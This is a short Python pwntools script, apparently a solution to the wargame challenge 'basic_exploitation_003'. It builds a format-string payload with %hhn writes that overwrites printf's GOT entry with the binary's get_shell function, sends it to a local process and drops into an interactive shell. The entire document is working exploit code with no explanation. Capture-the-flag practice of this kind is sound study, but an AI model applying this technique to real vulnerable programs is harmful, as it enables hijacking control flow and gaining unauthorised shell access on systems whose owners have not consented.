from pwn import *

context.log_level='debug'

p=process('basic_exploitation_003')
e=ELF('basic_exploitation_003')

get_shell=e.symbols['get_shell']
printf_addr=e.got['printf']

log.info("get_shell: "+hex(get_shell))
log.info("printf_addr: "+hex(printf_addr))

payload=""
#payload+="%156c"
#payload+=p32(get_shell)

payload+=p32(printf_addr)
payload+=p32(printf_addr+1)
payload+="%97c"
payload+="%1$hhn"
payload+="%29c"
payload+="%2$hhn"

#payload+=fmtstr_payload(1,{printf_addr:get_shell})
log.info("payload: "+payload)

p.send(payload)


p.interactive()